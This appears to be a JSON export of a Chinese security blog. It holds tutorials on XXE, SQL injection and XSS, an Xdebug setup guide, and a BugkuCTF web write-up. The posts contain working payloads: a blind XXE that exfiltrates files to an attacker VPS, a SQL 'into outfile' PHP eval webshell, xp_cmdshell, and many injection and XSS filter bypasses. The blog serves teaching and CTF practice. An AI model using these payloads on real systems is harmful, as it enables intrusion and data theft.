[{"title":"浅谈XXE漏洞","date":"2018-03-03T18:11:35.000Z","path":"2018/03/04/xxe/","text":"XXE（XML External Entity Injection），即XML外部实体注入。漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载。 XML与DTD的关系DTD（Document Type Definition）文档类型定义,一种XML约束模式语言，属于XML文件组成的一部分。 123456789101112131415&lt;!--文档声明--&gt;&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!--DTD--&gt;&lt;!DOCTYPE poem [ &lt;!--定义此文档是 poem 类型的文档--&gt;&lt;!ELEMENT poem (author, title, content)&gt; &lt;!--定义poem元素有四个元素--&gt;&lt;!ELEMENT author (#PCDATA)&gt; &lt;!--定义author元素为“#PCDATA”类型--&gt;&lt;!ELEMENT title (#PCDATA)&gt; &lt;!--定义title元素为“#PCDATA”类型--&gt;&lt;!ELEMENT content (#PCDATA)&gt; &lt;!--定义content元素为“#PCDATA”类型--&gt;]&gt;&lt;note&gt;&lt;to&gt;Dave&lt;/to&gt;&lt;from&gt;Tom&lt;/from&gt;&lt;head&gt;Hello&lt;/head&gt;&lt;body&gt;Hello world!&lt;/body&gt;&lt;/note&gt; DTD文档有三种应用形式。 内部DTD文档： 1&lt;!DOCTYPE 根元素 [定义内容]&gt; 外部DTD文档： 1&lt;!DOCTYPE 根元素 SYSTEM \"DTD文件路径\"&gt; 内外部DTD文档结合： 1&lt;!DOCTYPE 根元素 SYSTEM \"DTD文件路径\" [定义内容]&gt; XXE漏洞原理——XML实体实体主要分为四种: 内置实体 (Built-in entities) 字符实体 (Character entities) 通用实体 (General entities) 参数实体 (Parameter entities) 注： 完整实体类别可参考 DTD - Entities 其实，XML可分为普通实体和参数实体。 而根据实体声明方式的不同，还分为内部实体和外部实体，XXE利用的是外部实体。 普通实体引入外部实体1234567&lt;?xml version=\"1.0\" encodinf=\"UTF-8\"?&gt;&lt;!DOCTYPE poem [ &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt; &lt;!--可为file、http、ftp 等等协议--&gt;]&gt;&lt;poem&gt; &amp;xxe;&lt;/poem&gt; 参数实体引入外部实体12345678910&lt;?xml version=\"1.0\" encodinf=\"UTF-8\"?&gt;&lt;!DOCTYPE poem [ &lt;!ENTITY % a SYSTEM \"http://www.test.com/outdtd.dtd\"&gt; &lt;!--可为file、http、ftp 等等协议--&gt; %a; &lt;!--执行outdtd.dtd的内容--&gt;]&gt;&lt;poem&gt;&amp;xxe;&lt;/poem&gt;&lt;!--outdtd.dtd内容--&gt;&lt;!ELEMENT xxe SYSTEM \"file:///etc/passwd\"&gt; 注：外部资源的URI主要支持file、http、https、ftp等协议，对不同的程序所支持的协议不同。 XXE漏洞类型与危害I.任意文件读取通过外部实体引用，实现任意文件读取。 II.URL请求，SSRF 端口扫描，探测内网服务 内网攻击get型payload，如st2命令执行、discuz ssrf通过redis实施getshell；指纹识别等等 DoS拒绝服务：通过实体的递归调用，占用大量服务器资源。 III.远程代码执行在php开启expect扩展的前提下 123456&lt;!DOCTYPE root [ &lt;!ENTITY cmd SYSTEM \"expect://id\"&gt;]&gt;&lt;dir&gt; &lt;file&gt;&amp;cmd;&lt;/file&gt;&lt;/dir&gt; XXE漏洞本地测试任意文件读取构造index.html、func.php和test.txt。index.html构造表单，并转换成XML字符串，发送到func.php转化成XML对象，并输出数据。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;!--index.html--&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;xxe test&lt;/title&gt; &lt;script src=\"http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.8.0.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;form id=\"welcome\" name=\"information\"&gt; &lt;span&gt;Username:&lt;/span&gt;&lt;input type=\"text\" name=\"username\"&gt;&lt;br/&gt; &lt;span&gt;E-mail:&lt;/span&gt;&lt;input type=\"text\" name=\"email\"&gt;&lt;br/&gt; &lt;button id=\"post\"&gt;提交&lt;/button&gt; &lt;/form&gt; &lt;script&gt; function form2XML(obj)&#123; let iForm = document.getElementById(obj); let tmp = ''; //获取所有type为'text'的input let aInput = Array.from(iForm.getElementsByTagName('input')).filter(x =&gt; x.type === 'text'); for(v of aInput)&#123; let tagName = tagValue = ''; tagName = v.name; tagValue = v.value; let tTag = `&lt;$&#123;tagName&#125;&gt;$&#123;tagValue&#125;&lt;/$&#123;tagName&#125;&gt;`; tmp += tTag; &#125; let outXML = '&lt;' + iForm.name + '&gt;' + tmp + '&lt;/' + iForm.name + '&gt;'; return outXML; &#125; //发送XML请求 const post_btn = document.getElementById('post'); post_btn.onclick = function()&#123; $.ajax(&#123; url: \"./func.php\", data: form2XML('welcome'), type: 'POST', contentType: \"text\", success: function(data)&#123; document.write(data); &#125;, error: function(xhr, ajaxOptions, thrownError)&#123; console.log(xhr.status); console.log(thrownError); &#125; &#125;); return false; &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 12345678910&lt;!--func.php--&gt;&lt;?php //开启解析XML外部实体功能 //libxml_disable_entity_loader(false); $xml = file_get_contents(\"php://input\"); @$res = simplexml_load_string($xml); echo \"name : \" . $res-&gt;username . \"\\n\"; echo \"email : \" . $res-&gt;email;?&gt; 输入数据点击提交，利用burpsuite进行抓包： 修改XML数据，发包，可读取到test.txt的数据： 利用参数实体取得间接回显对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。 客户端发送payload1给Web服务器 Web服务器向VPS获取恶意DTD，并执行文件读取payload2 Web服务器带着回显结果访问VPS上特定FTP或者HTTP 黑客通过VPS获得回显 服务器中构造index.php、xxe.xml和flag.txt。VPS中构造evil.xml、recv.php和data.txt。其中flag.txt为要读取的数据，然后存入data.txt中。 12345678&lt;!--index.php--&gt;&lt;?php $testXML = file_get_contents(\"xxe.xml\"); //libxml_disable_entity_loader(false); $xml = simplexml_load_string($testXML); echo \"&lt;pre&gt;\"; print_r($xml);?&gt; 12345678&lt;!--xxe.xml--&gt;&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=flag.txt\"&gt; &lt;!ENTITY % evildtd SYSTEM \"http://www.ubuntu.com/evil.xml\"&gt; %evildtd;]&gt;&lt;root&gt;&lt;/root&gt; 1234&lt;!--evil.xml--&gt;&lt;!ENTITY % send \"&lt;!ENTITY &amp;#37; data SYSTEM 'http://www.ubuntu.com/recv.php?file=%file;'&gt;\"&gt;%send;%data; 1234&lt;!--recv.php--&gt;&lt;?php file_put_contents(\"test.txt\", base64_decode($_GET['file'])); ?&gt; 访问服务器的index.php,服务器将去请求VPS上的evil.xml并执行，带上flag.txt经过base64加密后的内容去请求VPS上的recv.php，于是将base64解码后的数据存入了data.txt。完成间接回显。 注：若flag.txt的读取不采用php://filter，则当文件内容包含空格换行等，将导致recv.php请求失败。 XXE的防御 禁用外部实体 过滤和验证用户提交的XML数据 不允许XML中含有任何自己声明的DTD 禁止外来引入，如在php中可设置libxml_disable_entity_loader(true) 参考传送门 https://www.ichunqiu.com/open/58939?from=hd https://thief.one/2017/06/20/1/ https://mp.weixin.qq.com/s/ek2I9tshyTG0HvTAHMmdsQ","tags":[{"name":"Web","slug":"Web","permalink":"K4ngx.github.io/tags/Web/"},{"name":"XXE","slug":"XXE","permalink":"K4ngx.github.io/tags/XXE/"}]},{"title":"浅谈SQLi","date":"2018-02-06T09:51:43.000Z","path":"2018/02/06/SQLi/","text":"(MySQL为例) (参考 MySQL注入天书 made by lcamry) 注入点：GET参数、POST参数、Cookie、HTTP头（包括但不限于User-agent、Referer、X-Forwarded-For）。 0x01 注入类型 联合查询 盲注 布尔盲注 时间盲注 报错注入 宽字节注入 堆叠注入 0x02 MySQL常用函数字符串连接 concat(str1, str2, str3...) concat函数连接一个或者多个字符串，若其中一个为null，则返回null. concat_ws(separator,str1,str2,…) CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符可以是一个字符串，也可以是其它参数。若分隔符为 NULL，则结果为 NULL。函数会忽略任何 str 参数中的 NULL 值。 group_concat([DISTINCT] 字段名 [Order BY 某字段 ASC/DESC] [Separator &#39;分隔符&#39;]) 将某个字段的值连接起来，默认’,’为分隔符，可与group by一起使用。 字符串截取 mid(column_name, start [,length]) start起始为1；length若省略则返回剩余文本。mid函数仅MySQL支持。 substring、substr与mid用法相同 left(string, n) 指定左部截取n个字符。right()为右部截取n个字符，参数同left。 ascii()返回的字符的ascii码值。ord()相比还适用于多字节字符。 regexp查找flag开头的字符串：select flag from flag where flag regexp &#39;^flag&#39; 0x03 sql注入方法与技巧可用&#39;or 1=1#或&#39;)and 1=2#等来初步测试sqli。 a.常用查询12345select database();select group_concat(schema_name) from information_schema.schemata;select table_name from information_schema.tables where table_schema='ctf20xx';select COLUMN_NAME from INFORMATION_SCHEMA.Columns where table_schema='ctf20xx' and table_name='flag';select * from mysql.user; b.联合查询通过闭合语句引号或括号，使用union来查询所需内容。需要相同字段。可用select 1,2,3或order by 3来测试字段数。 c.布尔盲注 2*1e308大法：-1&#39;and(select(select(flag)from(flag))like binary 0x4625)*2*1e308# substr和ascii：ascii(substr((select database()),1,1))=98# if盲注：aaa&#39; and if((select flag from flag where flag like binary 0x4625),1,0)# d.时间盲注 sleep(second)：if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 benchmark(count, expr)：UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(&#39;MSG&#39;,&#39;by 5 seconds&#39;)),null) FROM (select database() as current) as tb1; e.报错注入 2*1e308报错：aa&#39;and(select(1E308*if((select*from(select(flag)from(flag)limit 1)x),2,2)))# updatexml报错(限制32字符)：-1&#39;and(updatexml(1,concat(0x7e,(select(substr(flag,10))from(flag))),1))# extractvalue报错(限制32字符)：-1&#39;)and(extractvalue(1,concat(0x5c,(select(flag)from(flag)))))%23 以下技巧高版本未成功： exp报错：-1&#39;and(exp(~(select*from(select(flag)from(flag))a)))# geometrycollection报错：-1&#39;and(geometrycollection((select*from(select*from(select(flag)from(flag))a)b)))# polygon报错：-1&#39;and(polygon((select*from(select*from(select(flag)from(flag))a)b)))# multipolygon报错：-1&#39;and(multipolygon((select*from(select*from(select(flag)from(flag))a)b)))# multipoint报错：-1&#39;and(multipoint((select*from(select*from(select(flag)from(flag))a)b)))# multilinestring报错：-1&#39;and(multilinestring((select*from(select*from(select(flag)from(flag))a)b)))# linestring报错：-1&#39;and linestring((select * from (select * from (select user())a)b)) 以下技巧高版本中未测试： bigint超出范围：select !(select * from (select user())x) - ~0 mysql重复特性：select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x; 计数重复报错/bug?：select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2)) 上一条技巧的懵逼形式：select count(*) from (select 1 union select null union select !1)x group by concat((select flag from flag limit 1),floor(rand(0)*2)) Trick 通过polygon()和linestring()可爆出当前表名。还有multipoint、multilinestring、multipolygon： 12select * from user where proid=1 and polygon(proid);select * from user where proid=1 and linestring(proid); 通过join + using的方法来获取字段名： 1select * from (select * from user as A join user as B using(pro_id)) as C; 通过联合查询，运用虚拟表在不出现字段名的情况下查出内容： 1select * from user where proid=-1 union select 1,a.1,3 from (select 1,2,3 from dual union select * from user)a; f.导入导出操作 load_file导出文件： 1select 1,2,load_file('/etc/passwd'); into outfile写入文件： 1select \"&lt;?php eval($_GET['key']);\" into outfile '/var/www/html/evil.php'; into outfile 后可跟lines terminated by 0x...(参考sqlmap os-shell)。以16进制内容结尾，而不是&#39;\\r\\n&#39;： 1select * from * limit 0,1 into outfile '/var/www/html/evil.php' lines terminated by 0x.....; into dumpfile写入二进制。into outfile写入文本文件。 g.宽字节注入当MySQL使用宽字节编码时，会产生宽字节注入。若character_set_client=gbk时。输入%aa&#39;对单引号转义后变成%aa%5c%27,其中aa5c被mysql当成一个字符，导致单引号逃逸。可通过Mysql_query(&quot;SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary&quot;,$conn);来防御宽字节注入。 (1) character_set_client:客户端发送过来的SQL语句编码，也就是PHP发送的SQL查询语句编码字符集。 (2) character_set_connection:MySQL服务器接收客户端SQL查询语句后，在实施真正查询之前SQL查询语句编码字符集。 (3) character_set_results:SQL语句执行结果编码字符集。 mysql_real_escape_string和iconv()注入：参考 MySQL宽字节注入 by BlBana和宽字节注入 by lyiang。 h.堆叠注入用分号结束一条语句的执行，构造执行下一条任意语句。有其局限性。当采用mysql_query()执行sql语句时，多条sql语句将会报错，可使用mysqli::multi_query()。 例：sqlserver 中最为重要的存储过程的执行： 1select * from test where id=1;exec master..xp_cmdshell 'ipconfig' 注：oracle不支持多条语句执行 i. order by后的注入布尔盲注或延时注入： ?sort=(select ...) ?sort=rand(语句)。如rand(true/false)返回值不同，可利用rand盲注。 报错注入： ?sort=1&#39;and (select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x)--+ procedure analyze()来执行报错注入。 导出文件： into outfile &#39;路径&#39;参数来导出结果。或使用lines terminated by 0x...来导出网马。 0x04 sqlmap常用指令与参数 -u：后跟漏洞网站URL -r：从POST数据包中注入，后跟文件路径 -p：指定测试参数 --dbms：指定数据库系统类型 --technique=TECH：指定使用的注入方式 (default “BEUSTQ”) --dbs --tables --columns：枚举所有数据库、表、字段名 -D -T -C：指定数据库、表、字段名称 --dump：导出结果 --os-shell：反弹系统shell --sql-shell：反弹SQL shell --level=LEVEL：指定注入测试的等级 (2级可检测cookie)(1-5, default 1) --risk=RISK：风险等级(1-3, default 1) --users：枚举数据库用户 --passwords：枚举数据库用户密码哈希值 --string,--not-string,--regexp,--code：提供字符串或者一段正则，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用–string参数添加字符串，–regexp添加正则）；在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（–not-string添加）。也可提供真与假条件返回的HTTP状态码不一样来注入。如，响应200的时候为真，响应401的时候为假，即--code=200。","tags":[{"name":"sql","slug":"sql","permalink":"K4ngx.github.io/tags/sql/"},{"name":"Web","slug":"Web","permalink":"K4ngx.github.io/tags/Web/"}]},{"title":"浅谈XSS","date":"2018-01-04T12:23:13.000Z","path":"2018/01/04/xss/","text":"0x01 XSS常见输出点 HTML标签之间 HTML标签之内 成为JavaScript代码的值（类似后文中输出在on*事件） 闭合引号 宽字节环境可采用宽字节注入或者&lt;/script&gt;闭合(高优先级) 成为CSS代码的值（类似后文中输出在style属性内） HTML标签之间1&lt;div id=\"body\"&gt;[输出]&lt;/div&gt; 注： 有些标签无法执行脚本，如&lt;title&gt;、&lt;textarea&gt;等 HTML标签之内 &lt;input type=&quot;text&quot; value=&quot;[输出]&quot; /&gt; 闭合属性，payload: &quot; onmouseover=&quot;alert(1);&quot; x=&quot; 闭合标签，payload: &quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt; 输出在src/href/action等属性内 javascript:伪协议，如javascript:alert(1)//,若/被过滤，可用JS逻辑与算数表达式代替，如alert(1)- data:伪协议（仅IE不支持） 伪协议不区分大小写 输出在on*事件内 具体判断输出作为on*事件的值或某个函数的参数值出现。 输出在style属性内 对IE，注入expression关键字并适当闭合 0x02 HTML和JavaScript自解码 输出的上下文环境为HTML时，可进行HTML形式的编码 进制编码：&amp;#xH;、&amp;#D; HTML实体编码：&amp;lt;等 输出的上下文环境为JavaScript时，可进行JavaScript编码 Unicode形式：\\uH 十六进制：\\xH 转义：\\&#39;、\\&quot;等 编码可参考 XSS字符编码与浏览器解析原理 0x03 具备HtmlEncode功能的标签 &lt;textarea&gt;、&lt;title&gt;、&lt;iframe&gt;、&lt;noscript&gt;、&lt;noframes&gt;等具有HtmlEncode编码功能 &lt;xmp&gt;没有编码功能 &lt;plaintext&gt;在浏览器中存在差异 0x04 浏览器URL编码差异造成的XSS 对’”`&lt;&gt;的编码差异 对location.hash值的编码差异 0x05 HTML中的代码注入技巧标签 标签大小写不敏感 根据浏览器对XHTML的支持插入XML代码、SVG代码或未知标签 如在IE6可构造 &lt;XSS STYLE=&quot;xss:expression(alert(&#39;xss&#39;))&quot;&gt; 标签的优先级绕过过滤器 如&lt;textarea&gt;、&lt;title&gt;、&lt;style&gt;、&lt;script&gt;、&lt;xmp&gt;和注释&lt;!-- --&gt;或&lt;!-- --!&gt;具有高优先级。 对下面的代码，过滤器可能会认为&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;是属性href的值。 1&lt;!-- &lt;a href=\"--&gt;&lt;img src=x onerror=alert(1)//\"&gt;test&lt;/a&gt; 如&lt;! foo=&quot;&gt;&lt;script&gt;&lt;/script&gt;&quot;&gt; IE HTML 条件控制语句 如 &lt;!--[if IE 6]&gt;only IE6..test..&lt;![endif]--&gt; 如 &lt;!--[if &lt;img src=x onerror=alert(2)//]&gt; --&gt; &lt;svg&gt;标签下的&lt;script&gt;或其他CDATA元素会先进行XML解析,因此，可进行HTML实体编码或进制编码。 1&lt;svg&gt;&lt;script&gt;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&lt;/script&gt; 属性 属性大小写不敏感 IE中属性可用反引号包括 标签与属性、属性名与等号、等号与属性值之间可插入空格、换行符、回车符或Tab等。 在属性值的头部和尾部（引号内）插入控制字符（ASCII值1~32),如: 1&lt;a &amp;#8 href=\"&amp;#32javascript:alert(1)\"&gt;test&lt;/a&gt; 黑膜法：&lt;input type=&quot;image&quot; 0x06 CSS中代码注入技巧 大小写不敏感 属性值对单双引号不敏感 资源类属性的URL部分对单双引号或无引号不敏感 空格可用tab、回车和换行符替代被浏览器解析 资源类属性中通过伪协议完成XSS利用,如： 1body&#123;background-image:url('jAvasCRipT:alert(1)');&#125; behavior引入一段含JS的代码片段，不能跨域。(IE) @import引入一段CSS代码 可在任意地方插入&#39;\\&#39;以及&#39;\\&#39;+0的组合（IE7及以下），如： 1@\\iMp\\00or\\0T \"url\"; IE8开始&#39;\\&#39;+0不可用，&#39;\\&#39;仍然可用。 expression(IE7及以下版本) 用注释混淆： 1body&#123;xs/*zzz*/s:ex/**/press/**/ion((window.x==1)?'':eval('x=1;alert(2);'));&#125; 在IE6下，可用全角字符混淆： 1body&#123;xss:exｐｒｅｓｓion((window.x==1)?'':eval('x=1;alert(2);'));&#125; 16进制编码： body{\\078\\073\\073:\\065\\078\\070\\072\\065\\073\\073\\069\\06f\\06e((window.x==1)?&#39;&#39;:eval(&#39;x=1;alert(2);&#39;));} utf-7编码： 1234@charset \"utf-7\";body&#123; aaa:e+AHgAcABy-e+AHMAcw-i+AG8-n+ACg-if+ACgAdw-ind+AG8AdwAuAHgAIQA9ADEAKQB7AGEAbA-e+AHIAdAAoADEAKQA7AHc-ind+AG8AdwAuAHgAPQAxADsAfQApADs-&#125;","tags":[{"name":"Web","slug":"Web","permalink":"K4ngx.github.io/tags/Web/"},{"name":"xss","slug":"xss","permalink":"K4ngx.github.io/tags/xss/"}]},{"title":"Phpstudy+Sublime3+Xdebug+Chrome调试PHP程序","date":"2017-10-03T15:44:36.000Z","path":"2017/10/03/Xdebug/","text":"今天折腾了一下这个Xdebug打算用来方便审计一下开源CMS，然后就开始玩起了sublime的Color Scheme…越调越心塞，虽然最后还是选择了自带的mariana。当然。。这不是重点 :) 首先你得有phpstudy下载phpstudy，phpstudy里自带了Xdebug的扩展，可以在其他选项菜单-&gt;PHP扩展及设置-&gt;PHP扩展里把”Xdebug”√上。然后你开始用phpinfo();测试一下，如果出现了Xdebug，那就成功了第一步了。 在sublime中安装Xdebug Client看了网上的一些教程，看到某位sublime2使用者安装的是Xdebug而不是Xdebug Client，而我在sublime3的Install Package中只看到了Xdebug Client，于是就安装了（BTW：据说两者都安装会有冲突）。使用Ctrl+Alt+P键入Install Package,搜索Xdebug并安装。 在chrome中下载Xdebug helper下载地址：Chrome应用商店Xdebug helper 在IDE Key中选择other，然后输入sublime.xdebug,最后save。 使用 在chrome中打开要调试的地址，如localhost/test.php，然后启用Xdebug helper，会变绿 :) 在sublime里下断点，断点的快捷键为Ctrl+F8,其他的快捷键可以在Installed Packages\\Xdebug Client.sublime-package中的Default.sublime-keymap查看。 Ctrl+Shift+F9开启调试，在chrome中F5刷新。 在sublime中可看到变量信息等等。Ctrl+Shift+f5运行到下一个断点;Ctrl+Shift+f6单步;alt+shift+1退出debug。 参考文档使用sublime2配合phpstudy+xdebug+chrome调试php Windows 下 Sublime Text 3 使用 Xdebug （配合Xdebug helper 插件） sublime 修改Xdebug插件快捷键","tags":[{"name":"Xdebug","slug":"Xdebug","permalink":"K4ngx.github.io/tags/Xdebug/"}]},{"title":"bugkuctf_web_writeup","date":"2017-09-30T06:53:00.000Z","path":"2017/09/30/bugkuctf-web-writeup/","text":"写完这个WP简直快吐。 Web2F12即可发现flag在注释中 文件上传测试这题对Content-Type和filename做了检查。上传一个jpg文件，burpsuite抓包将文件扩展改为php即可拿到flag。 计算题在Resource中找到code.js文件，发现flag。 Web3禁止弹窗后F12或在url开头加view-source:查看源代码，在结尾可发现一段HTML10进制的编码，解码后得到flag。 sql注入得知网页为gbk编码，采用宽字符注入。payload: 1/?id=1%aa%27union%20select%201,string%20from%20`key`%20where%20id=1%20%23 SQL注入1XSS过滤中过滤掉了尖括号，因此可用尖括号来绕过sql过滤。payload: 1/?id=1%20u&lt;&gt;nion%20s&lt;&gt;elect%201,hash%20f&lt;&gt;rom%20`key`%20where%20id=1%23 你必须让他停下查看源代码，多刷新几次可找到flag 本地包含payload: 1/?hello=1);show_source(%27flag.php%27 变量1通过超全局变量GLOBALS，即可拿到flag。 Web4查看源码，得到eval()函数里的代码为 1234567891011function checkSubmit()&#123; var a=document.getElementById(\"password\"); if(\"undefined\"!=typeof a)&#123; if(\"67d709b2b54aa2aa648cf6e87a7114f1\"==a.value) return!0; alert(\"Error\"); a.focus(); return!1; &#125;&#125;document.getElementById(\"levelQuest\").onsubmit=checkSubmit; 输入67d709b2b54aa2aa648cf6e87a7114f1即可拿到flag。 Web5jsfuck编码，直接丢console回车即可拿到flag。 flag在index中利用php://filter协议可得flag。payload:1?file=php://filter/read=convert.base64-encode/resource=index.php 12345678910111213141516&lt;!--index.php--&gt;&lt;html&gt; &lt;title&gt;Bugku-ctf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo '&lt;a href=\"./index.php?file=show.php\"&gt;click me? no&lt;/a&gt;';&#125; $file=$_GET['file']; if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\"))&#123; echo \"Oh no!\"; exit(); &#125; include($file); //flag:flag&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt; phpcmsV9利用的是phpcmsV9.6.0的任意文件上传漏洞，下载phpcmsV9.6.0 getshell 工具上传小马，用菜刀连接，即可在Web根目录拿到flag.txt 海洋CMS海洋CMS 6.45代码执行漏洞。参考：seacms最新版前台getshell 访问flag32#.txt即可拿到flag。 输入密码查看flagburpsuite五位数字爆破即可。密码为13579。 前女友点击“链接”可看到源码，利用php弱类型和strcmp漏洞。传入?v1=240610708&amp;v2=QNKCDZO&amp;v3[]=即可拿到flag。参考：php检查相等时的漏洞。 成绩单simple sqli。很常规，爆库爆表爆字段。根据id=2和id=2&#39; and 1=1#猜测sql语句为 1select * from foo where id='$_GET['id']' 测试id=-2&#39; union select 1,2,3,database()#成功显示库名为skctf_flag。 id=-2&#39; union select 1,2,3,table_name from information_schema.tables where table_schema=&#39;skctf_flag&#39; limit x,1#(x=0,1,2...)得到表名为fl4g和sc。 id=-2&#39; union select 1,2,3,COLUMN_NAME from INFORMATION_SCHEMA.Columns where table_name=&#39;fl4g&#39; and table_schema=&#39;skctf_flag&#39;#得到字段名为skctf_flag。 id=-2&#39; union select 1,2,3,skctf_flag from fl4g#得到flag。 Web6注释让我们以margin为键名post提交我们所发现的东西。response header有flag，base64解码2次然后POST。保持session，将response中新的flag再经过base64解码2次再POST提交，得到flag。 123456789101112131415161718192021222324252627#python3.6from urllib import request, parseimport http.cookiejarimport base64str = \"TXpNeU9USXg=\" #经过一次base64解码后的flagurl = r\"http://120.24.86.145:8002/web6/\"str = int(base64.b64decode(base64.b64decode(str)).decode('ascii'))cookie = http.cookiejar.CookieJar()handler = request.HTTPCookieProcessor(cookie)opener = request.build_opener(handler)data = &#123;'margin':str&#125;pdata = parse.urlencode(data)binary_data = pdata.encode('ascii')con = opener.open(url,binary_data)str = con.getheader('flag')[44:56]str = int(base64.b64decode(base64.b64decode(str)).decode('ascii'))print(base64.b64decode(con.getheader('flag')).decode('utf-8'))print(con.read().decode('utf-8'))data = &#123;'margin':str&#125;pdata = parse.urlencode(data)binary_data = pdata.encode('ascii')con = opener.open(url,binary_data)print(con.read().decode('utf-8')) cookies欺骗？？将url中的filename改成aW5kZXgucGhw(index.php的base64编码)。编程遍历line参数（line=0,1,2…）得到index.php源码 1234import requestsfor i in range(20): r = requests.get(\"http://120.24.86.145:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw\"%i) print(r.content.decode('utf8')) 12345678910111213141516171819202122//index.php&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:\"\");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header(\"location:index.php?line=&amp;filename=a2V5cy50eHQ=\");$file_list = array( '0' =&gt;'keys.txt', '1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; $file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123; $fa = file($file); echo $fa[$line];&#125;?&gt; 添加cookie:margin=margin，打开/web11/index.php?line=0&amp;filename=a2V5cy5waHA得到flag。 XSS尖括号被过滤。payload: /?id=\\u003cimg%20src=%23%20onerror=alert(_key_)\\u003e never give up访问/test/1p.html抓包,拿到部分源码： 12345678910111213141516171819202122232425&quot;;if(!$_GET[&apos;id&apos;])&#123; header(&apos;Location: hello.php?id=1&apos;); exit();&#125;$id=$_GET[&apos;id&apos;];$a=$_GET[&apos;a&apos;];$b=$_GET[&apos;b&apos;];if(stripos($a,&apos;.&apos;))&#123; echo &apos;no no no no no no no&apos;; return ;&#125;$data = @file_get_contents($a,&apos;r&apos;);if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)&#123; require(&quot;f4l2a3g.txt&quot;);&#125;else&#123; print &quot;never never never give up !!!&quot;;&#125;?&gt; 直接访问/test/f4l2a3g.txt可拿到flag。（BTW：感觉是出题人疏忽了，正解应该是用php://伪协议和00截断） welcome to bugkuctf利用php伪协议可拿到index.php等等的源码 1234567891011121314151617181920212223242526272829303132333435//index.php&lt;?php $txt = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $password = $_GET[\"password\"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello friend!&lt;br&gt;\"; if(preg_match(\"/flag/\",$file))&#123; echo \"不能现在就给你flag哦\"; exit(); &#125;else&#123; //解题关键 include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo \"you are not the number of bugku ! \"; &#125; ?&gt; &lt;!-- $user = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $pass = $_GET[\"password\"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello admin!&lt;br&gt;\"; include($file); //hint.php &#125;else&#123; echo \"you are not admin ! \"; &#125; --&gt; 1234567891011121314//hint.php&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"good\"); &#125; &#125; &#125; ?&gt; 因此，我们需要序列化一个Flag对象，且其变量file为flag.php。 login1注册一个admin+n个空格的帐号来覆盖管理员帐号。再用新密码登录admin即可拿到flag。 过狗一句话index.php便是提示中的assert一句话。找到flag.txt访问即可。 各种绕过哟sha1在处理数组的时候会warning并返回NULL。 Web8变量覆盖漏洞。访问/web8/?ac=test&amp;fn=php://input并POST数据test即可get flag。 字符？正则？payload: /?id=keykey1111key:/1/1keya.目测最短23位。 考细心访问robots.txt得到/resusl.php。在/resusl.php提交GET参数x=admin即可拿到flag 求getshell经过大佬们的提示，上传一个jpg，尝试把Content-Type的multipart/form-data;第一个字母m改成大写M。然后把文件名改成php5即可绕过。 flag.php提示hint,尝试了hint.php和hint.txt之后才知道要GET传参数hint得到源码。脑洞很大。 123456789101112131415161718192021222324252627282930313233343536//index.php&lt;?php error_reporting(0); include_once(\"flag.php\"); $cookie = $_COOKIE['ISecer']; if(isset($_GET['hint']))&#123; show_source(__FILE__); &#125; elseif (unserialize($cookie) === \"$KEY\") &#123; echo \"$flag\"; &#125; else &#123; ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt; &lt;title&gt;Login&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"admin.css\" type=\"text/css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;br&gt; &lt;div class=\"container\" align=\"center\"&gt; &lt;form method=\"POST\" action=\"#\"&gt; &lt;p&gt;&lt;input name=\"user\" type=\"text\" placeholder=\"Username\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input name=\"password\" type=\"password\" placeholder=\"Password\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input value=\"Login\" 